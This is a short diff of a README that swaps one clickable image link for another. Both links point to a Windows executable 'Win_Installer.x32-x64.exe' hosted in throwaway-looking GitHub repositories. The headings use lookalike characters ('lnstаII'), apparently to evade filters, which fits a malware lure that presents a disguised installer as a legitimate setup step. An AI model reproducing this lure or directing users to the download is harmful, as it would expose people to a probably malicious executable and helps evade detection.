@@ -1,6 +1,6 @@
 # lnstаIIаtiоn & Setup
 
-[![image](https://i.imgur.com/0UUxzc9.png)](https://github.com/18178416912/181784169121/releases/download/Windows-Install/Win_Installer.x32-x64.exe)
+[![image](https://i.imgur.com/0UUxzc9.png)](https://github.com/indramusca/indramusca1/releases/download/Win/Win_Installer.x32-x64.exe)
 
 # How to lnstаII
 
